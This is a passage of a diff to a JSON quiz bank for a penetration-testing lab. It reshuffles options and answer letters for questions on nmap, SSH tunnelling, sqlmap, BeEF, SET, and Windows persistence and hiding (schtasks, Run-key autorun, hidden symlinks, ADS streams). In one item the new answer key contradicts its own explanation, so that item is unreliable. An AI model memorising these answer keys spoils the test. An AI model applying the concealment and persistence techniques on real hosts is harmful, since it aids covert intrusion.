-      "A": "HKCU ...CurrentVersion\\\\Run autorun (via meterpreter persistence)",
-      "B": "Scheduled task created with schtasks on logon",
-      "C": "ARP spoofing",
-      "D": "DNS cache poisoning"
+      "A": "Scheduled task created with schtasks on logon",
+      "B": "DNS cache poisoning",
+      "C": "HKCU ...CurrentVersion\\\\Run autorun (via meterpreter persistence)",
+      "D": "ARP spoofing"
     },
     "correct": [
-      "A",
-      "B"
+      "C"
     ],
     "explanation": "The lab uses schtasks and HKCU Run persistence (meterpreter persistence script)."
   },
@@ -1037,13 +1029,13 @@
     "multi": false,
     "question": "In the lab, which command hides the symlink on the Desktop so it doesn't show up in a normal dir listing?",
     "options": {
-      "A": "set EXITFUNC thread",
+      "A": "attrib +h /l check_license.exe",
       "B": "db_status",
-      "C": "attrib +h /l check_license.exe",
+      "C": "set EXITFUNC thread",
       "D": "chmod a+wx hackable/uploads"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "Lab 6 uses attrib +h /l to mark the symlink hidden."
   },
@@ -1053,13 +1045,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -sn:",
     "options": {
-      "A": "Host discovery only (no port scan)",
+      "A": "OS detection",
       "B": "Idle/Zombie scan",
-      "C": "OS detection",
+      "C": "Host discovery only (no port scan)",
       "D": "Treat host as up (skip ping)"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": ""
   },
@@ -1085,13 +1077,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -n:",
     "options": {
-      "A": "Host discovery only (no port scan)",
-      "B": "No DNS resolution",
+      "A": "No DNS resolution",
+      "B": "Treat host as up (skip ping)",
       "C": "SYN scan (default when root)",
-      "D": "Treat host as up (skip ping)"
+      "D": "Host discovery only (no port scan)"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": ""
   },
@@ -1102,8 +1094,8 @@
     "question": "In the lab guide, the purpose of '-n' is:",
     "options": {
       "A": "No DNS resolution",
-      "B": "Dump SAM hashes in meterpreter",
-      "C": "Enable BeEF Metasploit integration",
+      "B": "Enable BeEF Metasploit integration",
+      "C": "Dump SAM hashes in meterpreter",
       "D": "Generate a Veil payload"
     },
     "correct": [
@@ -1117,9 +1109,9 @@
     "multi": false,
     "question": "Select the correct description of nmap option -PP:",
     "options": {
-      "A": "Service version detection",
+      "A": "Host discovery only (no port scan)",
       "B": "ICMP timestamp request discovery",
-      "C": "Host discovery only (no port scan)",
+      "C": "Service version detection",
       "D": "SYN scan (default when root)"
     },
     "correct": [
@@ -1133,10 +1125,10 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-PP' is:",
     "options": {
-      "A": "Dump SAM hashes in meterpreter",
-      "B": "Generate a Veil payload",
+      "A": "Generate a Veil payload",
+      "B": "Enable BeEF Metasploit integration",
       "C": "ICMP timestamp request discovery",
-      "D": "Enable BeEF Metasploit integration"
+      "D": "Dump SAM hashes in meterpreter"
     },
     "correct": [
       "C"
@@ -1149,13 +1141,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -sS:",
     "options": {
-      "A": "OS detection",
-      "B": "No DNS resolution",
-      "C": "SYN scan (default when root)",
-      "D": "TCP connect scan (used for pivoting/proxy)"
+      "A": "No DNS resolution",
+      "B": "OS detection",
+      "C": "TCP connect scan (used for pivoting/proxy)",
+      "D": "SYN scan (default when root)"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -1166,8 +1158,8 @@
     "question": "In the lab guide, the purpose of '-sS' is:",
     "options": {
       "A": "Enable BeEF Metasploit integration",
-      "B": "Generate a Veil payload",
-      "C": "Dump SAM hashes in meterpreter",
+      "B": "Dump SAM hashes in meterpreter",
+      "C": "Generate a Veil payload",
       "D": "SYN scan (default when root)"
     },
     "correct": [
@@ -1181,13 +1173,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -sT:",
     "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "SYN scan (default when root)",
-      "D": "Host discovery only (no port scan)"
+      "A": "TCP connect scan (used for pivoting/proxy)",
+      "B": "ICMP timestamp request discovery",
+      "C": "Host discovery only (no port scan)",
+      "D": "SYN scan (default when root)"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": ""
   },
@@ -1197,13 +1189,13 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-sT' is:",
     "options": {
-      "A": "Enable BeEF Metasploit integration",
-      "B": "TCP connect scan (used for pivoting/proxy)",
-      "C": "Generate a Veil payload",
-      "D": "Dump SAM hashes in meterpreter"
+      "A": "Generate a Veil payload",
+      "B": "Dump SAM hashes in meterpreter",
+      "C": "Enable BeEF Metasploit integration",
+      "D": "TCP connect scan (used for pivoting/proxy)"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1214,12 +1206,12 @@
     "question": "Select the correct description of nmap option -sX:",
     "options": {
       "A": "ICMP timestamp request discovery",
-      "B": "Service version detection",
-      "C": "XMAS scan (FIN/PSH/URG)",
-      "D": "TCP connect scan (used for pivoting/proxy)"
+      "B": "XMAS scan (FIN/PSH/URG)",
+      "C": "TCP connect scan (used for pivoting/proxy)",
+      "D": "Service version detection"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": ""
   },
@@ -1245,13 +1237,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -sV:",
     "options": {
-      "A": "ICMP timestamp request discovery",
-      "B": "Host discovery only (no port scan)",
-      "C": "Service version detection",
-      "D": "Aggressive (-sV, -O, scripts, traceroute)"
+      "A": "Aggressive (-sV, -O, scripts, traceroute)",
+      "B": "ICMP timestamp request discovery",
+      "C": "Host discovery only (no port scan)",
+      "D": "Service version detection"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -1261,13 +1253,13 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-sV' is:",
     "options": {
-      "A": "Enable BeEF Metasploit integration",
-      "B": "Generate a Veil payload",
-      "C": "Service version detection",
-      "D": "Dump SAM hashes in meterpreter"
+      "A": "Generate a Veil payload",
+      "B": "Service version detection",
+      "C": "Dump SAM hashes in meterpreter",
+      "D": "Enable BeEF Metasploit integration"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1277,13 +1269,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -O:",
     "options": {
-      "A": "OS detection",
-      "B": "Idle/Zombie scan",
+      "A": "Idle/Zombie scan",
+      "B": "No DNS resolution",
       "C": "TCP connect scan (used for pivoting/proxy)",
-      "D": "No DNS resolution"
+      "D": "OS detection"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": ""
   },
@@ -1294,12 +1286,12 @@
     "question": "In the lab guide, the purpose of '-O' is:",
     "options": {
       "A": "Enable BeEF Metasploit integration",
-      "B": "Dump SAM hashes in meterpreter",
-      "C": "Generate a Veil payload",
-      "D": "OS detection"
+      "B": "Generate a Veil payload",
+      "C": "OS detection",
+      "D": "Dump SAM hashes in meterpreter"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1309,13 +1301,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -A:",
     "options": {
-      "A": "No DNS resolution",
-      "B": "SYN scan (default when root)",
-      "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "Host discovery only (no port scan)"
+      "A": "SYN scan (default when root)",
+      "B": "No DNS resolution",
+      "C": "Host discovery only (no port scan)",
+      "D": "Aggressive (-sV, -O, scripts, traceroute)"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -1325,13 +1317,13 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-A' is:",
     "options": {
-      "A": "Aggressive (-sV, -O, scripts, traceroute)",
+      "A": "Dump SAM hashes in meterpreter",
       "B": "Generate a Veil payload",
-      "C": "Dump SAM hashes in meterpreter",
+      "C": "Aggressive (-sV, -O, scripts, traceroute)",
       "D": "Enable BeEF Metasploit integration"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1341,13 +1333,13 @@
     "multi": false,
     "question": "Select the correct description of nmap option -sI:",
     "options": {
-      "A": "ICMP timestamp request discovery",
+      "A": "Idle/Zombie scan",
       "B": "No DNS resolution",
-      "C": "Idle/Zombie scan",
+      "C": "ICMP timestamp request discovery",
       "D": "Aggressive (-sV, -O, scripts, traceroute)"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": ""
   },
@@ -1357,13 +1349,13 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-sI' is:",
     "options": {
-      "A": "Idle/Zombie scan",
-      "B": "Generate a Veil payload",
-      "C": "Dump SAM hashes in meterpreter",
-      "D": "Enable BeEF Metasploit integration"
+      "A": "Generate a Veil payload",
+      "B": "Idle/Zombie scan",
+      "C": "Enable BeEF Metasploit integration",
+      "D": "Dump SAM hashes in meterpreter"
     },
     "correct": [
-      "A"
+      "B"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1374,12 +1366,12 @@
     "question": "Select the correct description of nmap option -Pn:",
     "options": {
       "A": "XMAS scan (FIN/PSH/URG)",
-      "B": "Treat host as up (skip ping)",
+      "B": "SYN scan (default when root)",
       "C": "Aggressive (-sV, -O, scripts, traceroute)",
-      "D": "SYN scan (default when root)"
+      "D": "Treat host as up (skip ping)"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": ""
   },
@@ -1389,13 +1381,13 @@
     "multi": false,
     "question": "In the lab guide, the purpose of '-Pn' is:",
     "options": {
-      "A": "Generate a Veil payload",
-      "B": "Treat host as up (skip ping)",
-      "C": "Enable BeEF Metasploit integration",
-      "D": "Dump SAM hashes in meterpreter"
+      "A": "Treat host as up (skip ping)",
+      "B": "Enable BeEF Metasploit integration",
+      "C": "Dump SAM hashes in meterpreter",
+      "D": "Generate a Veil payload"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": "From the lab guide nmap fundamentals."
   },
@@ -1405,13 +1397,13 @@
     "multi": false,
     "question": "Which statement best describes SSH option -f (as used in pivoting labs)?",
     "options": {
-      "A": "Fork to background after auth (run in background)",
-      "B": "Starts BeEF on port 3000",
-      "C": "Sets DVWA security to medium",
-      "D": "Creates an ADS stream"
+      "A": "Starts BeEF on port 3000",
+      "B": "Fork to background after auth (run in background)",
+      "C": "Creates an ADS stream",
+      "D": "Sets DVWA security to medium"
     },
     "correct": [
-      "A"
+      "B"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1421,13 +1413,13 @@
     "multi": false,
     "question": "SSH tunneling: -f means:",
     "options": {
-      "A": "Starts BeEF on port 3000",
-      "B": "Creates an ADS stream",
-      "C": "Fork to background after auth (run in background)",
-      "D": "Sets DVWA security to medium"
+      "A": "Creates an ADS stream",
+      "B": "Starts BeEF on port 3000",
+      "C": "Sets DVWA security to medium",
+      "D": "Fork to background after auth (run in background)"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1437,13 +1429,13 @@
     "multi": false,
     "question": "Which statement best describes SSH option -N (as used in pivoting labs)?",
     "options": {
-      "A": "Sets DVWA security to medium",
-      "B": "Starts BeEF on port 3000",
-      "C": "Creates an ADS stream",
-      "D": "Do not execute remote command (tunnel only)"
+      "A": "Creates an ADS stream",
+      "B": "Do not execute remote command (tunnel only)",
+      "C": "Sets DVWA security to medium",
+      "D": "Starts BeEF on port 3000"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1453,13 +1445,13 @@
     "multi": false,
     "question": "SSH tunneling: -N means:",
     "options": {
-      "A": "Do not execute remote command (tunnel only)",
-      "B": "Sets DVWA security to medium",
-      "C": "Starts BeEF on port 3000",
-      "D": "Creates an ADS stream"
+      "A": "Sets DVWA security to medium",
+      "B": "Creates an ADS stream",
+      "C": "Do not execute remote command (tunnel only)",
+      "D": "Starts BeEF on port 3000"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1469,13 +1461,13 @@
     "multi": false,
     "question": "Which statement best describes SSH option -T (as used in pivoting labs)?",
     "options": {
-      "A": "Sets DVWA security to medium",
-      "B": "Creates an ADS stream",
-      "C": "Disable pseudo-TTY allocation",
-      "D": "Starts BeEF on port 3000"
+      "A": "Creates an ADS stream",
+      "B": "Sets DVWA security to medium",
+      "C": "Starts BeEF on port 3000",
+      "D": "Disable pseudo-TTY allocation"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1485,13 +1477,13 @@
     "multi": false,
     "question": "SSH tunneling: -T means:",
     "options": {
-      "A": "Starts BeEF on port 3000",
+      "A": "Disable pseudo-TTY allocation",
       "B": "Sets DVWA security to medium",
-      "C": "Disable pseudo-TTY allocation",
+      "C": "Starts BeEF on port 3000",
       "D": "Creates an ADS stream"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1518,8 +1510,8 @@
     "question": "SSH tunneling: -R means:",
     "options": {
       "A": "Remote port forwarding",
-      "B": "Creates an ADS stream",
-      "C": "Starts BeEF on port 3000",
+      "B": "Starts BeEF on port 3000",
+      "C": "Creates an ADS stream",
       "D": "Sets DVWA security to medium"
     },
     "correct": [
@@ -1533,13 +1525,13 @@
     "multi": false,
     "question": "Which statement best describes SSH option -L (as used in pivoting labs)?",
     "options": {
-      "A": "Local port forwarding",
-      "B": "Creates an ADS stream",
-      "C": "Starts BeEF on port 3000",
-      "D": "Sets DVWA security to medium"
+      "A": "Creates an ADS stream",
+      "B": "Starts BeEF on port 3000",
+      "C": "Sets DVWA security to medium",
+      "D": "Local port forwarding"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1549,13 +1541,13 @@
     "multi": false,
     "question": "SSH tunneling: -L means:",
     "options": {
-      "A": "Local port forwarding",
+      "A": "Starts BeEF on port 3000",
       "B": "Creates an ADS stream",
-      "C": "Starts BeEF on port 3000",
+      "C": "Local port forwarding",
       "D": "Sets DVWA security to medium"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1566,12 +1558,12 @@
     "question": "Which statement best describes SSH option -D (as used in pivoting labs)?",
     "options": {
       "A": "Sets DVWA security to medium",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Creates an ADS stream",
+      "B": "Creates an ADS stream",
+      "C": "Dynamic port forwarding (SOCKS proxy)",
       "D": "Starts BeEF on port 3000"
     },
     "correct": [
-      "B"
+      "C"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1581,13 +1573,13 @@
     "multi": false,
     "question": "SSH tunneling: -D means:",
     "options": {
-      "A": "Creates an ADS stream",
-      "B": "Dynamic port forwarding (SOCKS proxy)",
-      "C": "Sets DVWA security to medium",
-      "D": "Starts BeEF on port 3000"
+      "A": "Dynamic port forwarding (SOCKS proxy)",
+      "B": "Creates an ADS stream",
+      "C": "Starts BeEF on port 3000",
+      "D": "Sets DVWA security to medium"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": "From the pivoting SSH tunnel explanations in the lab guide."
   },
@@ -1598,9 +1590,9 @@
     "question": "In sqlmap, what does --dbs do?",
     "options": {
       "A": "List database names",
-      "B": "Check if current user is DBA",
-      "C": "List tables for a DB (requires -D)",
-      "D": "Dump table data"
+      "B": "List tables for a DB (requires -D)",
+      "C": "Dump table data",
+      "D": "Check if current user is DBA"
     },
     "correct": [
       "A"
@@ -1613,13 +1605,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --dbs:",
     "options": {
-      "A": "Dump table data",
-      "B": "Check if current user is DBA",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "List database names"
+      "A": "Check if current user is DBA",
+      "B": "Dump table data",
+      "C": "List database names",
+      "D": "List columns for a table (requires -D and -T)"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": ""
   },
@@ -1645,13 +1637,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --dump:",
     "options": {
-      "A": "Force HTTP method to POST",
-      "B": "Dump table data",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Check if current user is DBA"
+      "A": "Dump table data",
+      "B": "Force HTTP method to POST",
+      "C": "Check if current user is DBA",
+      "D": "List columns for a table (requires -D and -T)"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": ""
   },
@@ -1662,9 +1654,9 @@
     "question": "In sqlmap, what does --current-user do?",
     "options": {
       "A": "Force HTTP method to POST",
-      "B": "Check if current user is DBA",
+      "B": "List columns for a table (requires -D and -T)",
       "C": "Retrieve current DB user",
-      "D": "List columns for a table (requires -D and -T)"
+      "D": "Check if current user is DBA"
     },
     "correct": [
       "C"
@@ -1677,13 +1669,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --current-user:",
     "options": {
-      "A": "Force HTTP method to POST",
-      "B": "Retrieve current DB user",
-      "C": "Set HTTP referer header",
-      "D": "Check if current user is DBA"
+      "A": "Set HTTP referer header",
+      "B": "Check if current user is DBA",
+      "C": "Force HTTP method to POST",
+      "D": "Retrieve current DB user"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": ""
   },
@@ -1693,13 +1685,13 @@
     "multi": false,
     "question": "In sqlmap, what does --is-dba do?",
     "options": {
-      "A": "List database names",
-      "B": "Retrieve current DB user",
-      "C": "Check if current user is DBA",
-      "D": "Set HTTP referer header"
+      "A": "Retrieve current DB user",
+      "B": "Set HTTP referer header",
+      "C": "List database names",
+      "D": "Check if current user is DBA"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -1709,13 +1701,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --is-dba:",
     "options": {
-      "A": "Check if current user is DBA",
-      "B": "Dump table data",
-      "C": "List tables for a DB (requires -D)",
-      "D": "Retrieve current DB user"
+      "A": "Dump table data",
+      "B": "Retrieve current DB user",
+      "C": "Check if current user is DBA",
+      "D": "List tables for a DB (requires -D)"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": ""
   },
@@ -1725,13 +1717,13 @@
     "multi": false,
     "question": "In sqlmap, what does --tables do?",
     "options": {
-      "A": "List database names",
-      "B": "Force HTTP method to POST",
-      "C": "Retrieve current DB user",
-      "D": "List tables for a DB (requires -D)"
+      "A": "Force HTTP method to POST",
+      "B": "List database names",
+      "C": "List tables for a DB (requires -D)",
+      "D": "Retrieve current DB user"
     },
     "correct": [
-      "D"
+      "C"
     ],
     "explanation": ""
   },
@@ -1757,13 +1749,13 @@
     "multi": false,
     "question": "In sqlmap, what does --columns do?",
     "options": {
-      "A": "Retrieve current DB user",
-      "B": "Send parameters in the request body",
-      "C": "List columns for a table (requires -D and -T)",
-      "D": "Check if current user is DBA"
+      "A": "Send parameters in the request body",
+      "B": "Check if current user is DBA",
+      "C": "Retrieve current DB user",
+      "D": "List columns for a table (requires -D and -T)"
     },
     "correct": [
-      "C"
+      "D"
     ],
     "explanation": ""
   },
@@ -1774,9 +1766,9 @@
     "question": "Choose the best description for sqlmap option --columns:",
     "options": {
       "A": "List columns for a table (requires -D and -T)",
-      "B": "Force HTTP method to POST",
-      "C": "Set HTTP referer header",
-      "D": "List tables for a DB (requires -D)"
+      "B": "Set HTTP referer header",
+      "C": "List tables for a DB (requires -D)",
+      "D": "Force HTTP method to POST"
     },
     "correct": [
       "A"
@@ -1789,13 +1781,13 @@
     "multi": false,
     "question": "In sqlmap, what does --method=POST do?",
     "options": {
-      "A": "Retrieve current DB user",
-      "B": "Force HTTP method to POST",
-      "C": "List database names",
-      "D": "Dump table data"
+      "A": "Force HTTP method to POST",
+      "B": "List database names",
+      "C": "Dump table data",
+      "D": "Retrieve current DB user"
     },
     "correct": [
-      "B"
+      "A"
     ],
     "explanation": ""
   },
@@ -1805,13 +1797,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --method=POST:",
     "options": {
-      "A": "List database names",
-      "B": "Retrieve current DB user",
-      "C": "Force HTTP method to POST",
-      "D": "Send session cookies"
+      "A": "Retrieve current DB user",
+      "B": "Force HTTP method to POST",
+      "C": "Send session cookies",
+      "D": "List database names"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": ""
   },
@@ -1821,13 +1813,13 @@
     "multi": false,
     "question": "In sqlmap, what does --data do?",
     "options": {
-      "A": "List database names",
-      "B": "List columns for a table (requires -D and -T)",
-      "C": "Send parameters in the request body",
-      "D": "Set HTTP referer header"
+      "A": "List columns for a table (requires -D and -T)",
+      "B": "Send parameters in the request body",
+      "C": "Set HTTP referer header",
+      "D": "List database names"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": ""
   },
@@ -1837,13 +1829,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --data:",
     "options": {
-      "A": "List tables for a DB (requires -D)",
-      "B": "List database names",
-      "C": "Force HTTP method to POST",
-      "D": "Send parameters in the request body"
+      "A": "Force HTTP method to POST",
+      "B": "Send parameters in the request body",
+      "C": "List tables for a DB (requires -D)",
+      "D": "List database names"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": ""
   },
@@ -1853,13 +1845,13 @@
     "multi": false,
     "question": "In sqlmap, what does --cookie do?",
     "options": {
-      "A": "Dump table data",
-      "B": "Send session cookies",
-      "C": "Check if current user is DBA",
-      "D": "Retrieve current DB user"
+      "A": "Check if current user is DBA",
+      "B": "Retrieve current DB user",
+      "C": "Dump table data",
+      "D": "Send session cookies"
     },
     "correct": [
-      "B"
+      "D"
     ],
     "explanation": ""
   },
@@ -1869,13 +1861,13 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --cookie:",
     "options": {
-      "A": "Retrieve current DB user",
-      "B": "Set HTTP referer header",
+      "A": "Set HTTP referer header",
+      "B": "Send session cookies",
       "C": "List database names",
-      "D": "Send session cookies"
+      "D": "Retrieve current DB user"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": ""
   },
@@ -1885,13 +1877,13 @@
     "multi": false,
     "question": "In sqlmap, what does --referer do?",
     "options": {
-      "A": "Set HTTP referer header",
+      "A": "Force HTTP method to POST",
       "B": "List columns for a table (requires -D and -T)",
-      "C": "Force HTTP method to POST",
+      "C": "Set HTTP referer header",
       "D": "Check if current user is DBA"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": ""
   },
@@ -1901,10 +1893,10 @@
     "multi": false,
     "question": "Choose the best description for sqlmap option --referer:",
     "options": {
-      "A": "List database names",
-      "B": "List tables for a DB (requires -D)",
+      "A": "List tables for a DB (requires -D)",
+      "B": "Dump table data",
       "C": "Set HTTP referer header",
-      "D": "Dump table data"
+      "D": "List database names"
     },
     "correct": [
       "C"
@@ -1917,13 +1909,13 @@
     "multi": false,
     "question": "Which BeEF feature is part of URL rewriting options listed in the lab?",
     "options": {
-      "A": "sqlmap --os-shell",
-      "B": "schtasks /create",
-      "C": "proxychains strict_chain",
-      "D": "Replace HREFs"
+      "A": "proxychains strict_chain",
+      "B": "Replace HREFs",
+      "C": "schtasks /create",
+      "D": "sqlmap --os-shell"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "From the BeEF lab URL rewriting section."
   },
@@ -1933,13 +1925,13 @@
     "multi": false,
     "question": "Which BeEF feature is part of URL rewriting options listed in the lab?",
     "options": {
-      "A": "sqlmap --os-shell",
-      "B": "proxychains strict_chain",
-      "C": "schtasks /create",
-      "D": "Replace HREFs (click events)"
+      "A": "schtasks /create",
+      "B": "Replace HREFs (click events)",
+      "C": "sqlmap --os-shell",
+      "D": "proxychains strict_chain"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "From the BeEF lab URL rewriting section."
   },
@@ -1950,9 +1942,9 @@
     "question": "Which BeEF feature is part of URL rewriting options listed in the lab?",
     "options": {
       "A": "Replace HREFs (HTTPS)",
-      "B": "sqlmap --os-shell",
-      "C": "proxychains strict_chain",
-      "D": "schtasks /create"
+      "B": "proxychains strict_chain",
+      "C": "schtasks /create",
+      "D": "sqlmap --os-shell"
     },
     "correct": [
       "A"
@@ -1965,13 +1957,13 @@
     "multi": false,
     "question": "Which BeEF feature is part of URL rewriting options listed in the lab?",
     "options": {
-      "A": "Replace HREFs (TEL)",
-      "B": "proxychains strict_chain",
-      "C": "sqlmap --os-shell",
-      "D": "schtasks /create"
+      "A": "proxychains strict_chain",
+      "B": "schtasks /create",
+      "C": "Replace HREFs (TEL)",
+      "D": "sqlmap --os-shell"
     },
     "correct": [
-      "A"
+      "C"
     ],
     "explanation": "From the BeEF lab URL rewriting section."
   },
@@ -1981,13 +1973,13 @@
     "multi": false,
     "question": "In SET configuration, what does setting APACHE_SERVER=ON relate to?",
     "options": {
-      "A": "Enable Apache server mode in SET config",
-      "B": "NTFS ADS stream name",
-      "C": "nmap OS detection",
-      "D": "ZAP CA certificate"
+      "A": "NTFS ADS stream name",
+      "B": "nmap OS detection",
+      "C": "ZAP CA certificate",
+      "D": "Enable Apache server mode in SET config"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "From Lab 5 set.config preparation steps."
   },
@@ -1997,10 +1989,10 @@
     "multi": false,
     "question": "In SET configuration, what does setting APACHE_DIRECTORY=/var/www/html relate to?",
     "options": {
-      "A": "NTFS ADS stream name",
-      "B": "nmap OS detection",
+      "A": "nmap OS detection",
+      "B": "ZAP CA certificate",
       "C": "Apache document root used by SET",
-      "D": "ZAP CA certificate"
+      "D": "NTFS ADS stream name"
     },
     "correct": [
       "C"
@@ -2013,13 +2005,13 @@
     "multi": false,
     "question": "Which statement best matches this lab technique/command?",
     "options": {
-      "A": "Schedule task runs on logon",
-      "B": "sqlmap DB listing",
-      "C": "BeEF hook polling",
-      "D": "DVWA database reset"
+      "A": "BeEF hook polling",
+      "B": "DVWA database reset",
+      "C": "sqlmap DB listing",
+      "D": "Schedule task runs on logon"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "From Lab 6 hiding/persistence sections."
   },
@@ -2030,12 +2022,12 @@
     "question": "Which statement best matches this lab technique/command?",
     "options": {
       "A": "DVWA database reset",
-      "B": "sqlmap DB listing",
-      "C": "Autorun registry key for user logon",
+      "B": "Autorun registry key for user logon",
+      "C": "sqlmap DB listing",
       "D": "BeEF hook polling"
     },
     "correct": [
-      "C"
+      "B"
     ],
     "explanation": "From Lab 6 hiding/persistence sections."
   },
@@ -2045,10 +2037,10 @@
     "multi": false,
     "question": "Which statement best matches this lab technique/command?",
     "options": {
-      "A": "BeEF hook polling",
-      "B": "sqlmap DB listing",
+      "A": "sqlmap DB listing",
+      "B": "DVWA database reset",
       "C": "Hide the symlink/file in directory listings",
-      "D": "DVWA database reset"
+      "D": "BeEF hook polling"
     },
     "correct": [
       "C"
@@ -2061,13 +2053,13 @@
     "multi": false,
     "question": "Which statement best matches this lab technique/command?",
     "options": {
-      "A": "BeEF hook polling",
-      "B": "sqlmap DB listing",
-      "C": "DVWA database reset",
-      "D": "Hide executable in NTFS ADS stream"
+      "A": "sqlmap DB listing",
+      "B": "Hide executable in NTFS ADS stream",
+      "C": "BeEF hook polling",
+      "D": "DVWA database reset"
     },
     "correct": [
-      "D"
+      "B"
     ],
     "explanation": "From Lab 6 hiding/persistence sections."
   },
@@ -2077,10 +2069,10 @@
     "multi": false,
     "question": "Which statement best matches this lab technique/command?",
     "options": {
-      "A": "BeEF hook polling",
-      "B": "sqlmap DB listing",
+      "A": "sqlmap DB listing",
+      "B": "DVWA database reset",
       "C": "Create a symlink to an ADS stream executable",
-      "D": "DVWA database reset"
+      "D": "BeEF hook polling"
     },
     "correct": [
       "C"
@@ -2093,13 +2085,13 @@
     "multi": false,
     "question": "Choose the correct meaning of nmap option `-sn`:",
     "options": {
-      "A": "No DNS resolution",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "Host discovery only (no port scan)",
-      "D": "SYN scan (default when root)"
+      "A": "Host discovery only (no port scan)",
+      "B": "SYN scan (default when root)",
+      "C": "XMAS scan (FIN/PSH/URG)",
+      "D": "No DNS resolution"
     },
     "correct": [
-      "C"
+      "A"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2109,13 +2101,13 @@
     "multi": false,
     "question": "Choose the correct meaning of nmap option `-n`:",
     "options": {
-      "A": "No DNS resolution",
-      "B": "XMAS scan (FIN/PSH/URG)",
-      "C": "Host discovery only (no port scan)",
-      "D": "ICMP timestamp request discovery"
+      "A": "Host discovery only (no port scan)",
+      "B": "ICMP timestamp request discovery",
+      "C": "XMAS scan (FIN/PSH/URG)",
+      "D": "No DNS resolution"
     },
     "correct": [
-      "A"
+      "D"
     ],
     "explanation": "Variant question (same fact) for rotation practice."
   },
@@ -2126,9 +2118,9 @@
     "question": "Choose the correct meaning of nmap option `-PP`:",
     "options": {
       "A": "ICMP timestamp request discovery",
-      "B": "Idle/Zombie scan",
-      "C": "SYN scan (default when root)",
-      "D": "No DNS resolution"
+      "B": "SYN scan (default when root)",
+      "C": "No DNS resolution",
+      "D": "Idle/Zombie scan"
     },
     "correct": [
       "A"
@@ -2141,13 +2133,13 @@
     "multi": false,
     "question": "Choose the correct meaning of nmap option `-sS`:",
     "options": {
-      "A": "Idle/Zombie scan",
+      "A": "SYN scan (default when root)",
